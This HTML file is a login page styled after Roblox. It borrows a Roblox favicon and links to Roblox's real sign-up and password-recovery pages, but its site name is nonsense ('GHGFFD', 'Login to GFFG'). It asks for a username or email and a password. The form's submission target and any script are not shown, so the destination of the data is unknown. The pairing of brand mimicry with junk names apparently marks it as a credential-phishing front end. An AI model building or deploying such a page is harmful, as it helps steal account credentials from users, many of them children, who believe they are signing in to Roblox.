<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>drtyn- Login</title>
    <link rel="icon" href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <nav class="mobile-nav">
        <div class="logo">
            <span>GHGFFD</span>
        </div>
        <a href="https://www.roblox.com/account/signupredir" class="signup-btn">Sign Up</a>
    </nav>
    
    <main class="main-content">
        <div class="login-container">
            <h1 class="login-header">Login to GFFG</h1>
            
            <form class="login-form" role="form" name="loginForm">
                <div class="form-group">
                    <input type="text" name="username" id="login-username" class="form-control" 
                           placeholder="Username/Email/Phone" required autocomplete="username">
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" id="login-password" class="form-control" 
                           placeholder="Password" required autocomplete="current-password">
                </div>
                
                <div id="error-message" class="error-message" style="display: none;"></div>
                
                <button type="submit" class="login-button" id="login-button">
                    <span id="button-text">Log In</span>
                    <img id="loading-gif" src="https://i.gifer.com/origin/b4/b4d657e7ef262b88eb5f7ac021edda87.gif" alt="Loading" style="display: none; height: 20px;">
                </button>
                
                <div class="forgot-credentials-link">
                    <a href="https://www.roblox.com/login/forgot-password-or-username" class="text-link">
                        Forgot Password or Username?
                    </a>
                </div>
            </form>
            
            <div class="signup-option">
                <span>Don't have an account? </span>
                <a href="https://www.roblox.com/account/signupredir" class="text-link">Sign Up</a>
            </div>
        </div>
    </main>
